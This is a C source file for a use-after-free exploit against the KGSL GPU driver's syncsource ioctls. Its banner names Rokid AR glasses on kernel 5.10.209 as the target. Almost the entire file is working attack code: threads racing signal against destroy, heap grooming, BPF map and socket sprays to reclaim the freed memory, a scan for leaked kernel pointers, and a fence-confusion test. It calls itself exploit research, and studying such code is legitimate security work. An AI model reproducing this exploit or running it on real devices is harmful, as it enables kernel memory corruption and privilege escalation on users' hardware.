/*
 * KGSL SyncSource UAF Exploit
 * ============================
 *
 * Exploit the confirmed race condition:
 * - Multi-FD SyncSource race shows 20/20 post-destroy signal success
 * - This means signal operations execute on freed syncsource structures
 *
 * Attack Strategy:
 * 1. Create syncsource
 * 2. Create fence from syncsource
 * 3. Race: Thread A signals fence, Thread B destroys syncsource
 * 4. After destroy, spray kernel objects to reclaim freed memory
 * 5. Thread A's signal operation corrupts new object
 *
 * Compile:
 * aarch64-linux-android31-clang -static -O2 -pthread -o kgsl_syncsource_uaf kgsl_syncsource_uaf.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sched.h>
#include <linux/bpf.h>

// ============================================================================
// KGSL Definitions
// ============================================================================

#define KGSL_IOC_TYPE 0x09

#define IOCTL_SYNCSOURCE_CREATE _IOWR(KGSL_IOC_TYPE, 0x40, struct syncsource_create)
#define IOCTL_SYNCSOURCE_DESTROY _IOW(KGSL_IOC_TYPE, 0x41, struct syncsource_destroy)
#define IOCTL_SYNCSOURCE_CREATE_FENCE _IOWR(KGSL_IOC_TYPE, 0x42, struct syncsource_create_fence)
#define IOCTL_SYNCSOURCE_SIGNAL_FENCE _IOWR(KGSL_IOC_TYPE, 0x43, struct syncsource_signal_fence)

struct syncsource_create
{
    unsigned int id;
};

struct syncsource_destroy
{
    unsigned int id;
};

struct syncsource_create_fence
{
    unsigned int id;
    int fence_fd;
};

struct syncsource_signal_fence
{
    unsigned int id;
    int fence_fd;
};

// ============================================================================
// BPF Map Spray
// ============================================================================

static int bpf_call(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

int create_bpf_array_map(int value_size, int entries)
{
    union bpf_attr attr = {0};
    attr.map_type = BPF_MAP_TYPE_ARRAY;
    attr.key_size = 4;
    attr.value_size = value_size;
    attr.max_entries = entries;
    return bpf_call(BPF_MAP_CREATE, &attr, sizeof(attr));
}

// ============================================================================
// Global State for Race
// ============================================================================

static int main_fd = -1;
static int race_fds[8] = {-1};
static volatile unsigned int target_sync_id = 0;
static volatile int target_fence_fd = -1;
static volatile int race_stop = 0;
static volatile int signal_after_destroy = 0;
static volatile int destroy_done = 0;
static volatile uint64_t signal_start_time = 0;
static volatile uint64_t destroy_time = 0;

// Get nanosecond timestamp
uint64_t get_ns(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000000000ULL + ts.tv_nsec;
}

// ============================================================================
// Race Threads
// ============================================================================

void *signal_thread(void *arg)
{
    int fd_idx = (int)(long)arg;
    int fd = race_fds[fd_idx];

    while (!race_stop)
    {
        if (target_sync_id == 0 || target_fence_fd < 0)
        {
            sched_yield();
            continue;
        }

        struct syncsource_signal_fence req = {
            .id = target_sync_id,
            .fence_fd = target_fence_fd};

        int ret = ioctl(fd, IOCTL_SYNCSOURCE_SIGNAL_FENCE, &req);

        if (ret == 0 && destroy_done)
        {
            // Signal succeeded after destroy!
            signal_after_destroy++;
        }
    }
    return NULL;
}

void *spray_thread(void *arg)
{
    // Wait for destroy
    while (!destroy_done && !race_stop)
    {
        sched_yield();
    }

    if (race_stop)
        return NULL;

    // Immediately spray kernel objects
    int spray_fds[64];
    int sprayed = 0;

    // Spray sockets (similar size to syncsource struct)
    for (int i = 0; i < 64; i++)
    {
        spray_fds[i] = socket(AF_UNIX, SOCK_STREAM, 0);
        if (spray_fds[i] >= 0)
        {
            sprayed++;
        }
    }

    // Keep them alive for a bit
    usleep(1000);

    // Cleanup
    for (int i = 0; i < sprayed; i++)
    {
        close(spray_fds[i]);
    }

    return NULL;
}

void *destroy_thread(void *arg)
{
    // Wait a bit for signals to start
    usleep(10);

    if (target_sync_id > 0)
    {
        struct syncsource_destroy req = {.id = target_sync_id};
        destroy_time = get_ns();
        ioctl(main_fd, IOCTL_SYNCSOURCE_DESTROY, &req);
        destroy_done = 1;
    }

    return NULL;
}

// ============================================================================
// Exploit Attempt
// ============================================================================

typedef struct
{
    int attempts;
    int uaf_hits;
    int crashes;
} exploit_stats_t;

void run_exploit_attempt(exploit_stats_t *stats)
{
    // Reset state
    race_stop = 0;
    destroy_done = 0;
    signal_after_destroy = 0;
    target_sync_id = 0;
    target_fence_fd = -1;

    // Create syncsource
    struct syncsource_create create_req = {0};
    if (ioctl(main_fd, IOCTL_SYNCSOURCE_CREATE, &create_req) < 0)
    {
        return;
    }
    target_sync_id = create_req.id;

    // Create fence
    struct syncsource_create_fence fence_req = {.id = target_sync_id};
    if (ioctl(main_fd, IOCTL_SYNCSOURCE_CREATE_FENCE, &fence_req) < 0)
    {
        struct syncsource_destroy d = {.id = target_sync_id};
        ioctl(main_fd, IOCTL_SYNCSOURCE_DESTROY, &d);
        return;
    }
    target_fence_fd = fence_req.fence_fd;

    // Start threads
    pthread_t signal_threads[4];
    pthread_t dt, st;

    for (int i = 0; i < 4; i++)
    {
        pthread_create(&signal_threads[i], NULL, signal_thread, (void *)(long)i);
    }
    pthread_create(&st, NULL, spray_thread, NULL);
    pthread_create(&dt, NULL, destroy_thread, NULL);

    // Let race run
    usleep(500);

    // Stop
    race_stop = 1;

    // Wait for threads
    for (int i = 0; i < 4; i++)
    {
        pthread_join(signal_threads[i], NULL);
    }
    pthread_join(dt, NULL);
    pthread_join(st, NULL);

    stats->attempts++;
    if (signal_after_destroy > 0)
    {
        stats->uaf_hits++;
    }

    // Cleanup
    if (target_fence_fd >= 0)
    {
        close(target_fence_fd);
    }
}

// ============================================================================
// Intensive UAF with Heap Spray
// ============================================================================

#define SPRAY_SIZE 256
static int bpf_spray_fds[SPRAY_SIZE];
static int socket_spray_fds[SPRAY_SIZE];

void prepare_spray(void)
{
    for (int i = 0; i < SPRAY_SIZE; i++)
    {
        bpf_spray_fds[i] = -1;
        socket_spray_fds[i] = -1;
    }
}

int do_bpf_spray(int count, int size)
{
    int created = 0;
    for (int i = 0; i < count && i < SPRAY_SIZE; i++)
    {
        bpf_spray_fds[i] = create_bpf_array_map(size, 1);
        if (bpf_spray_fds[i] >= 0)
        {
            created++;
        }
    }
    return created;
}

int do_socket_spray(int count)
{
    int created = 0;
    for (int i = 0; i < count && i < SPRAY_SIZE; i++)
    {
        socket_spray_fds[i] = socket(AF_UNIX, SOCK_STREAM, 0);
        if (socket_spray_fds[i] >= 0)
        {
            created++;
        }
    }
    return created;
}

void cleanup_spray(void)
{
    for (int i = 0; i < SPRAY_SIZE; i++)
    {
        if (bpf_spray_fds[i] >= 0)
        {
            close(bpf_spray_fds[i]);
            bpf_spray_fds[i] = -1;
        }
        if (socket_spray_fds[i] >= 0)
        {
            close(socket_spray_fds[i]);
            socket_spray_fds[i] = -1;
        }
    }
}

// ============================================================================
// Intensive Exploit with Heap Manipulation
// ============================================================================

void run_intensive_exploit(void)
{
    printf("\n=== Intensive UAF Exploit ===\n");

    // Phase 1: Defragment heap by allocating and freeing
    printf("[*] Defragmenting heap...\n");
    unsigned int defrag_ids[128];
    int defrag_count = 0;

    for (int i = 0; i < 128; i++)
    {
        struct syncsource_create req = {0};
        if (ioctl(main_fd, IOCTL_SYNCSOURCE_CREATE, &req) == 0)
        {
            defrag_ids[defrag_count++] = req.id;
        }
    }

    // Free every other one to create holes
    for (int i = 0; i < defrag_count; i += 2)
    {
        struct syncsource_destroy req = {.id = defrag_ids[i]};
        ioctl(main_fd, IOCTL_SYNCSOURCE_DESTROY, &req);
    }
    printf("[+] Created heap holes\n");

    // Phase 2: Create target syncsource in a hole
    struct syncsource_create target_req = {0};
    if (ioctl(main_fd, IOCTL_SYNCSOURCE_CREATE, &target_req) < 0)
    {
        printf("[-] Failed to create target syncsource\n");
        return;
    }
    printf("[+] Target syncsource: id=%d\n", target_req.id);

    // Create fence
    struct syncsource_create_fence fence_req = {.id = target_req.id};
    if (ioctl(main_fd, IOCTL_SYNCSOURCE_CREATE_FENCE, &fence_req) < 0)
    {
        printf("[-] Failed to create fence\n");
        return;
    }
    int fence_fd = fence_req.fence_fd;
    printf("[+] Fence fd=%d\n", fence_fd);

    // Phase 3: Destroy target while keeping fence
    printf("[*] Destroying syncsource while keeping fence...\n");
    struct syncsource_destroy destroy_req = {.id = target_req.id};
    ioctl(main_fd, IOCTL_SYNCSOURCE_DESTROY, &destroy_req);

    // Phase 4: Immediately spray to reclaim memory
    printf("[*] Spraying BPF maps to reclaim freed memory...\n");
    prepare_spray();
    int bpf_sprayed = do_bpf_spray(100, 64); // 64-byte values
    printf("[+] Sprayed %d BPF maps\n", bpf_sprayed);

    // Phase 5: Try to signal the destroyed syncsource
    printf("[*] Attempting signal on destroyed syncsource...\n");
    struct syncsource_signal_fence sig_req = {
        .id = target_req.id,
        .fence_fd = fence_fd};

    int sig_result = ioctl(main_fd, IOCTL_SYNCSOURCE_SIGNAL_FENCE, &sig_req);
    if (sig_result == 0)
    {
        printf("[!!!] SIGNAL SUCCEEDED ON DESTROYED SYNCSOURCE!\n");
        printf("[!!!] This is a Use-After-Free condition!\n");

        // The signal operation wrote to freed memory that might now contain
        // a BPF map or other kernel structure

        // Check if any BPF map got corrupted
        printf("[*] Checking BPF maps for corruption...\n");
        for (int i = 0; i < bpf_sprayed; i++)
        {
            union bpf_attr lookup_attr = {0};
            lookup_attr.map_fd = bpf_spray_fds[i];
            uint32_t key = 0;
            uint64_t value[8] = {0};
            lookup_attr.key = (uint64_t)&key;
            lookup_attr.value = (uint64_t)&value;

            if (bpf_call(BPF_MAP_LOOKUP_ELEM, &lookup_attr, sizeof(lookup_attr)) == 0)
            {
                // Check for non-zero/unusual values
                for (int j = 0; j < 8; j++)
                {
                    if (value[j] != 0)
                    {
                        printf("[!] BPF map %d has non-zero value at offset %d: 0x%lx\n",
                               i, j * 8, value[j]);

                        // Check for kernel pointer
                        if ((value[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL)
                        {
                            printf("[!!!] KERNEL POINTER LEAKED: 0x%lx\n", value[j]);
                        }
                    }
                }
            }
        }
    }
    else
    {
        printf("[-] Signal failed (syncsource properly invalidated): %s\n",
               strerror(errno));
    }

    // Cleanup
    close(fence_fd);
    cleanup_spray();

    // Cleanup remaining defrag syncsources
    for (int i = 1; i < defrag_count; i += 2)
    {
        struct syncsource_destroy req = {.id = defrag_ids[i]};
        ioctl(main_fd, IOCTL_SYNCSOURCE_DESTROY, &req);
    }
}

// ============================================================================
// Fence FD Confusion
// ============================================================================

void test_fence_confusion(void)
{
    printf("\n=== Fence FD Confusion Attack ===\n");

    // Create syncsource and fence
    struct syncsource_create ss_req = {0};
    if (ioctl(main_fd, IOCTL_SYNCSOURCE_CREATE, &ss_req) < 0)
    {
        printf("[-] Create syncsource failed\n");
        return;
    }

    struct syncsource_create_fence fence_req = {.id = ss_req.id};
    if (ioctl(main_fd, IOCTL_SYNCSOURCE_CREATE_FENCE, &fence_req) < 0)
    {
        printf("[-] Create fence failed\n");
        return;
    }

    int fence_fd = fence_req.fence_fd;
    printf("[+] Created syncsource %d, fence_fd %d\n", ss_req.id, fence_fd);

    // Try to signal with wrong syncsource ID
    for (unsigned int wrong_id = 1; wrong_id < 100; wrong_id++)
    {
        if (wrong_id == ss_req.id)
            continue;

        struct syncsource_signal_fence sig_req = {
            .id = wrong_id,
            .fence_fd = fence_fd};

        if (ioctl(main_fd, IOCTL_SYNCSOURCE_SIGNAL_FENCE, &sig_req) == 0)
        {
            printf("[!!!] Signal with wrong ID %d succeeded!\n", wrong_id);
        }
    }

    // Try to signal with wrong fence fd
    printf("[*] Testing signal with wrong fence_fd...\n");
    for (int wrong_fd = 3; wrong_fd < 20; wrong_fd++)
    {
        if (wrong_fd == fence_fd)
            continue;

        struct syncsource_signal_fence sig_req = {
            .id = ss_req.id,
            .fence_fd = wrong_fd};

        if (ioctl(main_fd, IOCTL_SYNCSOURCE_SIGNAL_FENCE, &sig_req) == 0)
        {
            printf("[!!!] Signal with wrong fence_fd %d succeeded!\n", wrong_fd);
        }
    }

    // Cleanup
    close(fence_fd);
    struct syncsource_destroy d = {.id = ss_req.id};
    ioctl(main_fd, IOCTL_SYNCSOURCE_DESTROY, &d);

    printf("[*] Fence confusion test complete\n");
}

// ============================================================================
// Main
// ============================================================================

int main(int argc, char **argv)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  KGSL SyncSource UAF Exploit                                  ║\n");
    printf("║  Target: Rokid AR Glasses (Kernel 5.10.209)                   ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");

    // Open main fd
    main_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (main_fd < 0)
    {
        printf("[-] Cannot open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] main_fd = %d\n", main_fd);

    // Open race fds
    for (int i = 0; i < 8; i++)
    {
        race_fds[i] = open("/dev/kgsl-3d0", O_RDWR);
        if (race_fds[i] < 0)
        {
            printf("[-] Cannot open race fd %d\n", i);
            return 1;
        }
    }
    printf("[+] Opened 8 race file descriptors\n");

    // Test 1: Basic race
    printf("\n=== Test 1: Basic Signal/Destroy Race ===\n");
    exploit_stats_t stats = {0};
    for (int i = 0; i < 50; i++)
    {
        run_exploit_attempt(&stats);
    }
    printf("[*] UAF hits: %d/%d attempts\n", stats.uaf_hits, stats.attempts);

    // Test 2: Fence confusion
    test_fence_confusion();

    // Test 3: Intensive exploit with heap spray
    run_intensive_exploit();

    // Cleanup
    for (int i = 0; i < 8; i++)
    {
        if (race_fds[i] >= 0)
            close(race_fds[i]);
    }
    close(main_fd);

    printf("\n=== Exploit Research Complete ===\n");
    return 0;
}
